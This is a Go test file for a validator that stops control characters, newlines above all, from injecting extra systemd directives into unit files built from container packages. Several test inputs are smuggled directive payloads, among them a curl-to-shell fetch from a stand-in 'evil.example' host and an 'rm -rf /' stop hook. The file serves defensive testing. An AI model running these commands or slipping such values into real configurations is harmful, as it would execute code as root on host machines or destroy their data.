package packages

import (
	"errors"
	"strings"
	"testing"
)

// A systemd unit file is line-oriented and its quoting does not span lines: a
// directive ends at the first raw newline no matter what quotes enclose it. So
// a package value carrying one does not corrupt its own line — everything after
// the newline is parsed as a fresh directive in the same [Service] section.
//
// That is a privilege boundary, not a formatting bug. A package author already
// controls the image and the command, which is authority over what runs inside
// a container. A systemd directive runs on the HOST as root, before podman is
// invoked at all.

func TestValidateNoControlCharsRejectsNewline(t *testing.T) {
	err := ValidateNoControlChars("environment FOO", "ok\nExecStartPre=/bin/sh -c 'curl http://evil.example | sh'")
	if !errors.Is(err, ErrControlCharacter) {
		t.Fatalf("ValidateNoControlChars(newline) = %v, want ErrControlCharacter", err)
	}
}

func TestValidateNoControlCharsRejectsControlBytes(t *testing.T) {
	for name, value := range map[string]string{
		"carriage return": "ok\rExecStartPre=/bin/false",
		"NUL":             "ok\x00truncated",
		"escape":          "ok\x1b[2Jclear",
		"DEL":             "ok\x7f",
		"vertical tab":    "ok\vmore",
		"form feed":       "ok\fmore",
	} {
		if err := ValidateNoControlChars("environment FOO", value); !errors.Is(err, ErrControlCharacter) {
			t.Errorf("ValidateNoControlChars(%s) = %v, want ErrControlCharacter", name, err)
		}
	}
}

// Tab is legitimate whitespace inside a value and systemd's tokenizer treats it
// as a separator that quoting genuinely does contain, so it is the one control
// character that passes.
func TestValidateNoControlCharsAllowsTabAndOrdinaryText(t *testing.T) {
	for name, value := range map[string]string{
		"tab":             "col1\tcol2",
		"spaces":          "--encoding=UTF8 --lc-collate=C",
		"shell metachars": "a && exec b",
		"unicode":         "naïve café Ωμέγα",
		"empty":           "",
	} {
		if err := ValidateNoControlChars("environment FOO", value); err != nil {
			t.Errorf("ValidateNoControlChars(%s) = %v, want nil", name, err)
		}
	}
}

func TestValidateNoControlCharsNamesTheField(t *testing.T) {
	err := ValidateNoControlChars("command[2]", "bad\nvalue")
	if err == nil {
		t.Fatal("expected an error")
	}
	if !strings.Contains(err.Error(), "command[2]") {
		t.Errorf("error %q does not name the offending field", err)
	}
}

// --- Compile-level cover ---

// The author's literal is caught by Validate(), which runs at the top of
// Compile.
func TestCompileRejectsControlCharInAuthorEnvironment(t *testing.T) {
	ip := &InputPackage{
		Image:       InputPackageImage{URL: "nginx:1.0"},
		Environment: map[string]string{"FOO": "ok\nExecStartPre=/bin/sh -c 'id > /tmp/pwned'"},
	}

	if _, err := ip.Compile(Responses{}); !errors.Is(err, ErrControlCharacter) {
		t.Fatalf("Compile with a newline in an author environment value = %v, want ErrControlCharacter", err)
	}
}

func TestCompileRejectsControlCharInAuthorCommand(t *testing.T) {
	ip := &InputPackage{
		Image:   InputPackageImage{URL: "nginx:1.0"},
		Command: []string{"sh", "-c", "echo hi\nExecStopPost=/bin/rm -rf /"},
	}

	if _, err := ip.Compile(Responses{}); !errors.Is(err, ErrControlCharacter) {
		t.Fatalf("Compile with a newline in an author command = %v, want ErrControlCharacter", err)
	}
}

// This is the case Validate() alone cannot catch, and the reason the sweep is
// repeated after substitution.
//
// Validate() runs BEFORE iterateFields substitutes @markers@, so it sees the
// literal `@evil@` — which carries no control character of its own and passes.
// The newline arrives with the response. A question with no `type:` is
// validated by nothing else at all, which makes this the path that actually
// reaches a unit file with caller-chosen bytes in it.
func TestCompileRejectsControlCharArrivingViaResponse(t *testing.T) {
	ip := &InputPackage{
		Image:       InputPackageImage{URL: "nginx:1.0"},
		Environment: map[string]string{"FOO": "@evil@"},
		Questions: map[string]Question{
			"evil": {Query: "anything"},
		},
	}

	_, err := ip.Compile(Responses{"evil": "ok\nExecStartPre=/bin/sh -c 'id > /tmp/pwned'"})
	if !errors.Is(err, ErrControlCharacter) {
		t.Fatalf("Compile with a newline arriving through a response = %v, want ErrControlCharacter", err)
	}
}

func TestCompileRejectsControlCharInResponseSubstitutedCommand(t *testing.T) {
	ip := &InputPackage{
		Image:   InputPackageImage{URL: "nginx:1.0"},
		Command: []string{"sh", "-c", "@arg@"},
		Questions: map[string]Question{
			"arg": {Query: "anything"},
		},
	}

	_, err := ip.Compile(Responses{"arg": "echo hi\nExecStopPost=/bin/false"})
	if !errors.Is(err, ErrControlCharacter) {
		t.Fatalf("Compile with a newline in a substituted command arg = %v, want ErrControlCharacter", err)
	}
}

// A clean package still compiles. Nothing that worked before is refused: a
// multi-line value already produced a broken unit, so the only change is that
// it fails loudly instead of silently.
func TestCompileAcceptsOrdinaryValues(t *testing.T) {
	ip := &InputPackage{
		Image: InputPackageImage{URL: "nginx:1.0"},
		Environment: map[string]string{
			"POSTGRES_INITDB_ARGS": "--encoding=UTF8 --lc-collate=C",
			"GREETING":             "@who@",
		},
		Command: []string{"sh", "-c", "exec nginx -g 'daemon off;'"},
		Questions: map[string]Question{
			"who": {Query: "who"},
		},
	}

	pkg, err := ip.Compile(Responses{"who": "world"})
	if err != nil {
		t.Fatalf("Compile of an ordinary package: %v", err)
	}
	if pkg.Environment["GREETING"] != "world" {
		t.Errorf("GREETING = %q, want %q", pkg.Environment["GREETING"], "world")
	}
}
